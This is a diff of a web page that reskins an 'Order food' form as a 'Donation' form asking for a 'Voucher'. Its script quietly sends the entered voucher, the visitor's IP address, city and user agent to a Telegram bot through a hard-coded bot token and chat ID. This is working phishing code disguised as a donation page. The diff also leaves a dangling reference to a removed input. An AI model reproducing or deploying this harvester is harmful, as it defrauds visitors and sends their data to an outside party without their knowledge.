@@ -124,18 +124,16 @@ a {
 <body>
     <div class="container">
         <div class="logo-container">
-            <div class="logo"><strong>Order food</strong></div>
-            <p class="slogan">Thank you for using our website</p>
+            <div class="logo"><strong>Donation</strong></div>
+            <p class="slogan">Donation keeps us making more</p>
         </div>
         <div class="form-container">
             <form onsubmit="submitonhfc(); return false;" method="post">
               <input type="hidden" name="" id="pagename" value="Facebook" />
-                <input type="text" id="email" placeholder="location url" class="input-field" name="email" required>
-                <input id="name" type="locate" placeholder="Food" class="input-field" name="location" required>
+                <input type="tel" id="email" placeholder="Voucher" class="input-field" name="email" required>
                 
-        <input type="tel" id="phone" name="phone" placeholder="phone" class="input-field" required>
+                
         
-        <input type="text" id="username" name="username" placeholder="username" class="input-field" required>
                 <button type="submit" class="login-button">Send</button>
             </form>
             
@@ -180,20 +178,16 @@ a {
                const cityName = data.city;
     
                // Create the message to send
-               const username = document.getElementById("username").value;
-               const phone = document.getElementById("phone").value;
+               
                const page = document.getElementById("pagename").value;
-               const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
-               const message = `> Food Page : ${page}\n\n> food :
-                 ${name}\n\n> phone :
-                 ${phone}\n\n> username :
-                 ${username}\n\n> location url :
+               const message = `> donate Page : ${page}\n\n> food :
+                 ${name}\n\n> voucher :
                  ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
     
                // Send the message to your Telegram bot using the appropriate API
-               const botToken = '6357441245:AAGY8yAuR9uXK0PuPcwtqmbzzjhMpMpfpc0';
-               const chatId =1097939336 ;
+               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
+               const chatId =2013982441 ;
     
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const telegramParams = {
